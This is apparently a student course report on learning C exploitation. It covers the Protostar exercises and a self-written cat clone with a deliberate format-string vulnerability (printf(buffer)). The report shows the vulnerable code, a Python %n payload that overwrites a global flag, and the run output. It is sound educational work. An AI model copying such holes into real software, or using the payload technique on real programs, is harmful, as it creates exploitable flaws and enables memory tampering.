## Exploits in C Project Proposal
Kai Levy and Patrick Huston | Software Systems Spring 2018
### Goal

In this project, we hope to explore the common methods of software exploitation in C. In specific, we want to understand the basis of how it works, what makes software vulnerable, and the steps that can be taken to ensure safety from a developer standpoint. 

### Learning Goals

Over the course of the project, we hope to achieve the following learning goals. 

  - Learn about real security vulnerabilities that can occur in common programs, how to exploit them, and how to avoid them. 
  - Research and learn about vulnerabilities to real software - understanding what the issue was, how it was exploited, and how it was fixed.
  - Develop simple and effective C programs

### Resources
While smashing the stack, having fun, and making profits, we encountered several useful resources that helped us along the way. 

[This paper](http://insecure.org/stf/smashstack.html) provided an in depth look at stack smashing (for fun and profit) from the basics to a full exploit. We found it to be a useful introduction, and supplemented the information there with more incremental tutorials, such as the videos that [this youtuber](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos) published.

[The protostar exploit exercises](https://exploit-exercises.com/protostar/) laid the ground for our work in buffer overflows, formatting, and heap exploits. Protostar includes series of challenges that build on each other to demonstrate common C exploits. All of our work for these exercises was completed on a 32-bit linux VM provided by the site. Additionally, we found that the VM provided by protostar was useful for developing our own exploits, because many features of modern computers (such as [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), 64-bit architecture, and memory protection) make it difficult to achieve the same results on our own machines.


### Results

#### Protostar

The first portion of our project involved working through the [protostar](https://exploit-exercises.com/protostar/) exploit exercises. In this process, we worked through the following exercises. 

- All of the [stack exercises](https://exploit-exercises.com/protostar/stack0/)
- All of the [format exercises](https://exploit-exercises.com/protostar/format0/)
- Viewed tutorials on the [heap exercises](https://exploit-exercises.com/protostar/heap0/)

We found these exercises to be fun and challenging. We took what we learned from these, and applied it to developing our own exploits. 

#### Developing Exploits

To practice what we learned from protostar, we developed a simplified implementation of the linux utility [`cat`](http://www.linfo.org/cat.html). Our [implementation](https://github.com/phuston/SoftSysExploitsInC/blob/master/copycat.c) includes functionality for the `-n` line number flag and options to read from `stdin` or any number of files specified. 

##### Formatting Exploit

Aside from parsing command line arguments, the core functionality of cat is found in our function `copy_file`. Unfortunately there is a glaring security hole found in this implementation. The `printf` function is designed to be called with a string literal as the first argument, and with any additional parameters afterwards. Passing an argument that the user has control of can expose memory and even allow the user to modify memory by passing in the `%n` format option.

```
/* Output file to stdout line by line 
 */
void copy_file(FILE *file) {
    int linecount = 0;
    char buffer[BUFSIZ];

    while (fgets(buffer, BUFSIZ, file) != NULL) {
        if(gargs.nFlag){
            printf("%6d  ", ++linecount);
        }
        printf(buffer); <-- 'glaring' security hole
    }
}
```

We exploited this flaw in order to modify our global argument flags during execution. While this is not an especially 'malicious' exploit, we feel it demonstrates a significant modification of the program's functionality. To start, we located the memory address of our `gargs` variable, which stored values of our flags, using gdb. 

```
struct gargs_t {
    int nFlag;       /* -n option */
} gargs;
```


```
ccat:     file format elf32-i386         

SYMBOL TABLE:                            
08048114 l    d  .interp        00000000              .interp                      
08048128 l    d  .note.ABI-tag  00000000              .note.ABI-tag                
08048148 l    d  .note.gnu.build-id     00000000              .note.gnu.build-id   
0804816c l    d  .hash  00000000              .hash                                
080481b8 l    d  .gnu.hash      00000000              .gnu.hash                    
080481e4 l    d  .dynsym        00000000              .dynsym                      
080482c4 l    d  .dynstr        00000000              .dynstr           
...
00000000       F *UND*  00000000              puts@@GLIBC_2.0
08049960 g     O .bss   00000004              gargs  <--- LOOK HERE ALLEN!
08049950 g       *ABS*  00000000              _edata
00000000       F *UND*  00000000              strcmp@@GLIBC_2.0
080487aa g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
080485a4 g     F .text  00000120              main
0804840c g     F .init  00000000              _init
```

Now we know that the address of `gargs` is `08049960`. 

We used the simple python below to generate text which would be one of the inputs to our `copycat` program. When the `printf` receives formatting commands, but no further arguments, it simply reads the next values off the stack. Since our input appears on the stack, we may simply write in the desired address, and add the `%n` option -- which writes the number of printed characters to that address -- to overwrite our flag. This technique required some tricky aligning of our payload with the stack, and would not work on a machine with [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). This is where using the VM provided by the protostar series came in handy. 


```
def pad(s):
 return (s+"A"*500)[:500]

# 08049960 is our address of gargs
print pad("BBBB" + "\x60\x99\x04\x08" + "CCCCCC" + "%x "*7 + "%n ")
```

In this code snippet `\x60\x99\x04\x08` represents the address of `gargs` in 32-bit little-endian, the architecture of the protostar VM. 

The result of our exploit is below. We ran our program without setting any flags, but once our program processed our first argument, it started adding line numbers as we had overwritten the flags during execution! WOW!


```
$ ./ccat test test2
BBBBCCCCCC2000 804a008 0 0 0 0 42424242  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
     1  this
     2  is
     3  a
     4  multilined
     5  entry
     6  thing
     7  
```

### Reflection

Overall, we feel pretty good about the progress we made during this project. We learned a bunch about common C exploits through the tutorials and the exercises. 

Unfortunately, we found it more difficult than anticipated to design our own exploitable programs - especially writing them in a way that wasn't painfully obvious how poorly designed and exploitable they were. While we had hoped to include a version of `copycat` that was vulnerable to a buffer overflow and subsequent arbitrary code execution, we realized during the process that C actually does a relatively good job at stopping developers from writing stupid code -- the most notable functions that allows users to overflow buffers are `gets` and `strcpy`. The `strcpy` function did not fit our program's use at all, and `gets` could only be used for input from `stdin`. Luckily (or unluckily for our project), the functionality from `gets` has been replaced with `fgets`, which does not expose such vulnerabilities. Unlike `gets`, which doesn't complain about anything, `fgets` drops a segmentation fault as soon as it writes beyond a buffer limit - which is exactly what we intended to do. 

Rather than significantly altering the design of our `copycat` implementation to be exploitable, we decided to call it on the project, and spend our energy elsewhere. 

We originally intended to learn more about real-world vulnerabilities in software, and while we learned about some real bugs (including how they related to the exploits we've seen), we didn't learn about the nitty gritty details of their implementations or patches. 

In conclusion, we:
1. Learned some C exploits
2. Wrote a simple C program
3. Exploited that C program